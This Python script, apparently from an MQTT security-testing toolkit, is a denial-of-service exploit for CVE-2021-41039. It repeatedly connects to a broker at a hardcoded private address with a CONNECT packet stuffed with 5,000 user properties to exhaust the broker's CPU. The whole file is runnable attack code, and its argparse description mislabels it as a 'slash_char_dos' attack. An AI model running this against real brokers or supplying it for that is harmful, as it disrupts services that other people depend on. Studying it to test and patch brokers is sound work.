import argparse
import random
import socket

import paho.mqtt.client as mqtt
import mqtt_utilities as util
import time


def generate_properties():
    properties = mqtt.Properties(mqtt.PacketTypes.CONNECT)
    key = "k"
    value = "v"
    user_property = []
    for i in range(5000):
        user_property.append((key + str(i), value + str(i)))
    properties.UserProperty = user_property
    return properties


def main(username, password, duration=10.0, number=20.0):
    """The user properties dos attack connects with a large amount of user properties to cause excessive CPU usage and loss of performance by exploiting CVE-2021-41039"""

    broker = "10.0.0.1"
    port = 1883
    generated_properties = generate_properties()
    interval = duration / float(number)
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    failure_count = 0
    start_time = time.time()
    elapsed_time = time.time() - start_time
    while elapsed_time < duration:
        if failure_count >= 30:
            print("Broker unreachable, ending script...", flush=True)
            return
        print("Sending malformed CONNECT packet...", flush=True)
        try:
            client.connect(broker, port, properties=generated_properties)
        except (socket.error, Exception) as e:
            print(f"Failed to reach the broker, exception: {e}", flush=True)
            failure_count += 1
            time.sleep(10)
            continue
        time.sleep(interval * random.random())
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
    else:
        print("Time elapsed, execution is terminating...", flush=True)
        client.disconnect()
        return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    parser.add_argument("-n", "--number", type=int, help="number of messages to send")
    args = parser.parse_args()
    main(args.username, args.password, args.duration, args.number)
